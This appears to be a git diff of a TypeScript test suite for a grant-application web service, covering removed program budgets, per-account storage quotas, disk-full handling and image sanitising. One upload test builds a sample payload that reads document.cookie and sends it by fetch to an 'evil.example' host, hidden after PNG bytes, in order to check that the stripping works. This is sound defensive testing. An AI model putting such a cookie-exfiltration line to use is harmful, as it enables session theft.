@@ -1,4 +1,5 @@
 import { createHmac } from "node:crypto";
+import sharp from "sharp";
 import { memorySignInRepo } from "./lib/signIns";
 import type { AddressInfo } from "node:net";
 import type { Server } from "node:http";
@@ -12,7 +13,8 @@ import { ensureSeedPrograms, memoryProgramRepo, type ProgramRepo } from "./lib/p
 import { memoryApplicationRepo, type ApplicationRepo } from "./lib/applicationRepo";
 import { memoryActivity } from "./lib/activity";
 import { memoryDocumentRepo, type DocumentRepo } from "./lib/documentRepo";
-import { memoryFileStore } from "./lib/fileStore";
+import { memoryFileStore, StorageFullError } from "./lib/fileStore";
+import { MAX_ACCOUNT_FILE_BYTES, STORAGE_FULL_MESSAGE } from "./lib/storageGuard";
 import { appUrl, deliverBatch, memoryOutbox, resendMailer, RETRY_MINUTES, staffInviteEmail, unconfiguredMailer } from "./lib/email";
 import { hookEmails } from "./lib/authEmails";
 import { memoryEmailSettingsRepo } from "./lib/emailSettings";
@@ -220,7 +222,7 @@ describe("initial super admin", () => {
 // A valid new program; the deadline is always about three months out.
 const newProgram = (overrides: Record<string, unknown> = {}) => ({
   name: "Rural Makers", summary: "Tools and training for rural workshops.", focus: "Rural makers",
-  maxFunding: 5000, minimumRequest: 500, budget: 50000, deadline: new Date(Date.now() + 90 * 86_400_000).toISOString().slice(0, 10),
+  maxFunding: 5000, minimumRequest: 500, deadline: new Date(Date.now() + 90 * 86_400_000).toISOString().slice(0, 10),
   minimumTier: 1, requirements: ["Workshop photos"], requiresRegistration: false, questions: [], approvalDays: 7, commissionRate: 0, ...overrides,
 });
 const post = (path: string, body: unknown, token = "tok-super") => call(path, token, { method: "POST", body: JSON.stringify(body) });
@@ -257,6 +259,15 @@ describe("grant programs", () => {
     expect(applicant).not.toContain("space");
     expect(staff).toContain("space");
     expect(staff).toHaveLength(5);
+  });
+
+  it("sends no budget to anyone, and ignores one an older portal still sends (owner, 7 Oct 2026)", async () => {
+    for (const token of ["tok-applicant", "tok-finance"]) {
+      for (const g of await json(await call("/programs", token))) expect(g).not.toHaveProperty("budget");
+    }
+    const created = await post("/programs", { ...newProgram({ name: "Old Portal Plan" }), budget: 50000 });
+    expect(created.status).toBe(201);
+    expect((await json(created)).program).not.toHaveProperty("budget");
   });
 
   it("lets only programs.manage change programs", async () => {
@@ -602,7 +613,7 @@ describe("applications and review", () => {
     expect((await decide(application.id, "approve", { version: v, award: 1000 })).status).toBe(200);
   });
 
-  it("locks criteria after the first submission and keeps the budget above awards", async () => {
+  it("locks criteria after the first submission", async () => {
     await verify("tok-maya", MAYA);
     const { application } = await json(await submit({ grantId: "creative", application: creative }));
     const v = (await json(await decide(application.id, "start-review", { version: application.updatedAt }))).application.updatedAt;
@@ -611,15 +622,13 @@ describe("applications and review", () => {
     const { id: _id, status: _status, updatedAt, changeLog: _log, ...input } = grant;
     const tier = await json(await put("/programs/creative", { version: updatedAt, program: { ...input, minimumTier: 2 } }));
     expect(tier.fieldErrors.minimumTier).toMatch(/Locked/);
-    const budget = await json(await put("/programs/creative", { version: updatedAt, program: { ...input, budget: 3000, maxFunding: 3000 } }));
-    expect(budget.fieldErrors).toMatchObject({ budget: expect.stringMatching(/already awarded/) });
   });
 
-  it("never lets two approvals spend the same budget", async () => {
+  it("has no overall budget: two simultaneous approvals both succeed, limited only by each request and the plan maximum", async () => {
     await verify("tok-maya", MAYA);
     await verify("tok-applicant", ALEX);
     const deadline = new Date(Date.now() + 30 * 86_400_000).toISOString().slice(0, 10);
-    const created = await json(await post("/programs", { name: "Tight Budget", summary: "A program with room for one award.", focus: "Testing", maxFunding: 6000, minimumRequest: 100, budget: 10000, deadline, minimumTier: 1, requirements: ["A plan"], requiresRegistration: false, questions: [], approvalDays: 5, commissionRate: 0 }));
+    const created = await json(await post("/programs", { name: "No Budget", summary: "A program with no overall budget.", focus: "Testing", maxFunding: 6000, minimumRequest: 100, deadline, minimumTier: 1, requirements: ["A plan"], requiresRegistration: false, questions: [], approvalDays: 5, commissionRate: 0 }));
     await post(`/programs/${created.program.id}/publish`, { version: created.program.updatedAt });
     const input = { ...creative, requestedAmount: 6000, checklist: ["A plan"] };
     const a = (await json(await submit({ grantId: created.program.id, application: input }))).application;
@@ -627,7 +636,10 @@ describe("applications and review", () => {
     const va = (await json(await decide(a.id, "start-review", { version: a.updatedAt }))).application.updatedAt;
     const vb = (await json(await decide(b.id, "start-review", { version: b.updatedAt }))).application.updatedAt;
     const results = await Promise.all([decide(a.id, "approve", { version: va, award: 6000 }), decide(b.id, "approve", { version: vb, award: 6000 })]);
-    expect(results.map(r => r.status).sort()).toEqual([200, 400]);
+    expect(results.map(r => r.status)).toEqual([200, 200]);
+    expect((await json(await call("/applications", "tok-super"))).filter((x: { grantId: string; status: string }) => x.grantId === created.program.id && x.status === "Approved")).toHaveLength(2);
+    // Each application is still approved once: a repeat with the old version is stale.
+    expect((await decide(b.id, "approve", { version: vb, award: 6000 })).status).toBe(409);
   });
 
   it("refuses reviews of your own application", async () => {
@@ -1220,6 +1232,43 @@ describe("deposit methods and proof of payment", () => {
     expect((await json(await call("/notifications", "tok-maya")))[0].body).toMatch(/\$97\.00 .* after the \$3\.00 charge/);
   });
 
+  it("keeps each account's files under 200 MB in total, counting documents and deposit receipts", async () => {
+    await create();
+    await call("/profile", "tok-maya");
+    const maya = USERS["tok-maya"]!.id;
+    const d = pendingDeposit(await json(await deposit({ amount: 100, method: "paypal", details: ANSWERS })));
+    const up = await json(await uploadProof(d.id, PNG));
+    const proofId = up.money.transactions.find((t: { id: string }) => t.id === d.id).proof[0].id;
+    // A stand-in record for files already kept: with the receipt, one byte short of room for the PDF.
+    await documents.insert({ ownerId: maya, purpose: "application", applicationId: "APP-0", requirement: "x", fileName: "big.pdf", contentType: "application/pdf", sizeBytes: MAX_ACCOUNT_FILE_BYTES - PNG.length - PDF.length + 1, sha256: "0", storageKey: `${maya}/00000000-0000-4000-8000-000000000000` });
+    const full = await upload("tok-maya", "purpose=identity");
+    expect(full.status).toBe(409);
+    expect((await json(full)).error).toMatch(/^Your account can keep up to 200 MB of files and 200\.0 MB is used\./);
+    expect((await uploadProof(d.id, PNG)).status).toBe(409);
+    // Removing the receipt makes room: receipts count toward the total.
+    expect((await post(`/money/deposits/${d.id}/proof/${proofId}/delete`, {}, "tok-maya")).status).toBe(200);
+    expect((await upload("tok-maya", "purpose=identity")).status).toBe(201);
+    expect((await uploadProof(d.id, PNG)).status).toBe(409);
+    // Other accounts aren't affected.
+    await call("/profile", "tok-applicant");
+    expect((await upload("tok-applicant", "purpose=identity")).status).toBe(201);
+  });
+
+  it("pauses every upload with 507 when the disk is low, and alerts staff once", async () => {
+    await create();
+    await call("/profile", "tok-maya");
+    const d = pendingDeposit(await json(await deposit({ amount: 100, method: "paypal", details: ANSWERS })));
+    files.put = async () => { throw new StorageFullError(1.5 * 1024 * 1024 * 1024, 2 * 1024 * 1024 * 1024); };
+    for (const res of [await upload("tok-maya", "purpose=identity"), await uploadProof(d.id, PNG), await uploadPhoto("paypal", PNG)]) {
+      expect(res.status).toBe(507);
+      expect(await json(res)).toEqual({ error: STORAGE_FULL_MESSAGE });
+    }
+    expect(await documents.listForOwner(USERS["tok-maya"]!.id)).toEqual([]);
+    const alerts = (await json(await call("/staff-feed", "tok-super"))).filter((e: { title: string }) => e.title === "Server storage is low: uploads are paused");
+    expect(alerts).toHaveLength(1);
+    expect(alerts[0]).toMatchObject({ kind: "security", highlight: true, body: expect.stringMatching(/^1536\.0 MB free on the documents disk; uploads stop below 2048\.0 MB\./) });
+  });
+
   it("keeps proof of payment on the server: the owner uploads and removes it, finance opens it (audited), and confirming waits for it", async () => {
     await create();
     await call("/profile", "tok-maya");
@@ -1286,7 +1335,6 @@ describe("deposit methods and proof of payment", () => {
 
 describe("documents", () => {
   const MAYA = USERS["tok-maya"]!.id;
-  const PNG = Buffer.concat([Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), Buffer.from("image")]);
   const identity = { documentType: "Passport", documentNumber: "AB12345678", nameOnDocument: "Maya Okafor" };
   const input = { businessName: "Okafor Studio", requestedAmount: 4000, registrationNumber: "", purpose: "A kiln and a year of glaze materials for the studio.", checklist: ["Portfolio link", "Project budget", "Professional reference"], answers: {} };
   const mineDocs = async (token = "tok-maya") => json(await call("/documents/mine", token));
@@ -1302,6 +1350,37 @@ describe("documents", () => {
     expect(res.status).toBe(201);
     expect(await json(res)).toMatchObject({ purpose: "identity", contentType: "image/png", fileName: "passport.pdf", sizeBytes: PNG.length });
     expect(files.files.size).toBe(1);
+  });
+
+  it("stores pictures rebuilt from their pixels: code hidden after a real image and photo location are gone; fake pictures are refused", async () => {
+    await call("/profile", "tok-maya");
+    const JS = Buffer.from("const s=document.cookie;fetch('https://evil.example/?c='+s);");
+    const hidden = Buffer.concat([PNG, JS]);
+    const res = await upload("tok-maya", "purpose=identity", hidden, "passport.png");
+    expect(res.status).toBe(201);
+    const doc = await json(res);
+    const stored = files.files.get([...files.files.keys()][0]!)!;
+    expect(stored.includes(Buffer.from("document.cookie"))).toBe(false);
+    expect(doc).toMatchObject({ contentType: "image/png", sizeBytes: stored.length });
+    expect(await sharp(stored).metadata()).toMatchObject({ format: "png", width: 8, height: 6 });
+    // The download is the rebuilt copy and passes its SHA-256 check.
+    const download = await file(doc.id, "tok-maya");
+    expect(download.status).toBe(200);
+    expect(Buffer.from(await download.arrayBuffer()).equals(stored)).toBe(true);
+
+    // A phone photo's GPS and camera details don't survive (deposit receipts and profile photos are rebuilt the same way).
+    const photo = await sharp(JPEG).withExif({ IFD0: { Make: "PhoneCo" }, IFD3: { GPSLatitudeRef: "N", GPSLatitude: "51/1 30/1 0/1" } }).toBuffer();
+    expect((await putAvatar(photo)).status).toBe(200);
+    const avatar = Buffer.from(await (await call("/profile/avatar", "tok-maya")).arrayBuffer());
+    expect((await sharp(avatar).metadata()).exif).toBeUndefined();
+    expect(avatar.includes(Buffer.from("PhoneCo"))).toBe(false);
+
+    // An image header with anything but a picture behind it isn't stored.
+    const fake = await upload("tok-maya", "purpose=identity", Buffer.concat([PNG.subarray(0, 8), JS]), "fake.png");
+    expect(fake.status).toBe(422);
+    expect((await json(fake)).error).toMatch(/couldn't be read/);
+    expect((await putAvatar(Buffer.concat([JPEG.subarray(0, 4), JS]))).status).toBe(422);
+    expect(await mineDocs()).toHaveLength(1);
   });
 
   it("takes files for a plan's form fields and needs one for each required file field before submitting", async () => {
@@ -1329,6 +1408,31 @@ describe("documents", () => {
     const ok = await submit();
     expect(ok.status).toBe(200);
     expect((await json(ok)).application.commissionRate).toBeNull();
+  });
+
+  it("saves and submits long-text answers up to 2,000 characters, and names the field past a limit", async () => {
+    await call("/profile", "tok-maya");
+    const questions = [{ id: "", label: "Tell us about your team", type: "textarea", required: true }];
+    const created = await json(await post("/programs", newProgram({ name: "Long Answers", requirements: [], questions })));
+    await post(`/programs/${created.program.id}/publish`, { version: created.program.updatedAt });
+    const grantId = created.program.id;
+    const long = (answer: string, extra: Record<string, unknown> = {}) => ({ ...input, requestedAmount: 1000, checklist: [], answers: { "tell-us-about-your-team": answer }, ...extra });
+    // 1,500 characters: refused by the API before 7 Oct 2026 with a generic error.
+    const draft = await post("/applications/save", { grantId, application: long("a".repeat(1500)) }, "tok-maya");
+    expect(draft.status).toBe(200);
+    const draftId = (await json(draft)).application.id;
+    const submitted = await post("/applications/submit", { grantId, draftId, application: long("a".repeat(2000)) }, "tok-maya");
+    expect(submitted.status).toBe(200);
+    expect((await json(submitted)).application.answers["tell-us-about-your-team"]).toHaveLength(2000);
+
+    const tooLong = await post("/applications/save", { grantId: "creative", application: long("a".repeat(2001), { purpose: "p".repeat(5001) }) }, "tok-maya");
+    expect(tooLong.status).toBe(400);
+    expect(await json(tooLong)).toEqual({
+      error: "Fix the highlighted fields and try again.",
+      fieldErrors: { "answers.tell-us-about-your-team": "Keep this to 2,000 characters or fewer.", purpose: "Keep this to 5,000 characters or fewer." },
+    });
+    const noProgram = await post("/applications/save", { application: long("ok") }, "tok-maya");
+    expect(await json(noProgram)).toEqual({ error: "Send the program id and your application." });
   });
 
   it("refuses files carrying scripts, programs, hidden archives, or PDF actions", async () => {
@@ -1726,7 +1830,7 @@ describe("email settings, domain, sign-up confirmation, webhook, and inbox", () 
   });
 
   describe("brand colours, logos, and favicon", () => {
-    const LOGO = Buffer.concat([Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), Buffer.alloc(64, 7)]);
+    const LOGO = PNG;
     const putImage = (path: string, bytes: Buffer, token = "tok-super") => fetch(`${base}${path}`, { method: "PUT", body: new Uint8Array(bytes), headers: { authorization: `Bearer ${token}`, "content-type": "application/octet-stream" } });
     const savedAppUrl = process.env["APP_URL"];
     beforeEach(() => { process.env["APP_URL"] = "https://grants.example.org"; });
@@ -1942,9 +2046,11 @@ describe("Supabase's Send Email Hook", () => {
 // ---------- Profile center (user_profile_ui_design_operation.md) ----------
 
 const MAYA_ID = "66666666-6666-4666-8666-666666666666";
-const PNG = Buffer.concat([Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), Buffer.alloc(64, 1)]);
-const JPEG = Buffer.concat([Buffer.from([0xff, 0xd8, 0xff, 0xe0]), Buffer.alloc(64, 2)]);
-const WEBP = Buffer.concat([Buffer.from("RIFF"), Buffer.from([0x40, 0, 0, 0]), Buffer.from("WEBPVP8 "), Buffer.alloc(64, 3)]);
+// Real pictures: uploads are rebuilt from their pixels, so made-up bytes behind an image header are refused.
+const picture = (format: "png" | "jpeg" | "webp") => sharp({ create: { width: 8, height: 6, channels: 3, background: { r: 51, g: 102, b: 204 } } }).toFormat(format).toBuffer();
+const PNG = await picture("png");
+const JPEG = await picture("jpeg");
+const WEBP = await picture("webp");
 const putAvatar = (bytes: Buffer, token = "tok-maya") => fetch(`${base}/profile/avatar`, { method: "PUT", body: bytes, headers: { authorization: `Bearer ${token}`, "content-type": "application/octet-stream" } });
 const WINDOWS_CHROME = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36";
 const signInFrom = (token: string, deviceId: string) => call("/sign-ins", token, { method: "POST", body: JSON.stringify({ deviceId }), headers: { "user-agent": WINDOWS_CHROME } });
